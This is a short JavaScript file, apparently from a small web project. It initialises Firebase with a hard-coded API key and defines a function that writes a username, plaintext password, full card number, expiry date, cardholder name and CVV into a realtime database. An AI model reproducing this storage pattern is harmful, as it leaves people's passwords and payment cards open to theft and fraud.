// Initialize Firebase
var config = {
  apiKey: "AIzaSyCICh0h2ycXil8nJhTT2PTGs362RgnHueI",
  authDomain: "jaam-3a6bf.firebaseapp.com",
  databaseURL: "https://jaam-3a6bf.firebaseio.com",
  projectId: "jaam-3a6bf",
  storageBucket: "jaam-3a6bf.appspot.com",
  messagingSenderId: "371452559747"
};
firebase.initializeApp(config);

function writeUserData(inp_username, inp_password, inp_cardNumber, inp_cardExpirationMonth,inp_cardExpirationYear,inp_cardName,inp_cardCVV) {
  firebase.database().ref('users/' + inp_username).set({
  pass: inp_password,
  card_number: inp_cardNumber,
  auth_month: inp_cardExpirationMonth,
  auth_year: inp_cardExpirationYear,
  name: inp_cardName,
  auth_cvv: inp_cardCVV,
  user: inp_username
  });
}
